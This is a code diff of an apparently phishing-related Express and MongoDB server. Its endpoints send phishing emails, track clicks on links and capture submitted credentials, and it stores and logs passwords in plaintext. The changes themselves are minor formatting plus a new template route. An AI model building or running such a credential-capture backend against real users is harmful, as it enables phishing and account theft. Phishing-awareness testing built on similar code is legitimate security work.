@@ -1,7 +1,7 @@
 const mongoose = require("mongoose");
 const PhishingClick = require("./models/PhishingClick");
 const CapturedCredential = require("./models/CapturedCredential");
-
+const emailTemplateRoutes = require("./routes/emailTemplates");
 
 require("dotenv").config();
 const express = require("express");
@@ -23,7 +23,6 @@ mongoose
   .catch((err) => console.error("❌ MongoDB error:", err));
 
 const PORT = process.env.PORT || 5000;
-
 
 // Configure Email Transporter
 const transporter = nodemailer.createTransport({
@@ -67,7 +66,6 @@ app.post("/send-phishing-email", async (req, res) => {
   }
 });
 
-
 // API Endpoint to Track Clicks on Phishing Links
 app.get("/track-click", async (req, res) => {
   const { email } = req.query;
@@ -93,7 +91,6 @@ app.get("/track-click", async (req, res) => {
     res.status(500).send("Error tracking click");
   }
 });
-
 
 // Get all phishing click data
 app.get("/clicks", async (req, res) => {
@@ -129,9 +126,9 @@ app.post("/submit-credentials", async (req, res) => {
     await CapturedCredential.findOneAndUpdate(
       { email }, // Match by email
       {
-        $set: { password, timestamp: new Date() } // Update password and timestamp
+        $set: { password, timestamp: new Date() }, // Update password and timestamp
       },
-      { upsert: true, new: true } // Insert if not found
+      { upsert: true, new: true }, // Insert if not found
     );
 
     console.log("Captured credentials saved/updated:", { email, password });
@@ -141,7 +138,6 @@ app.post("/submit-credentials", async (req, res) => {
     res.status(500).json({ error: "Server error" });
   }
 });
-
 
 app.get("/api/phishing-clicks", async (req, res) => {
   try {
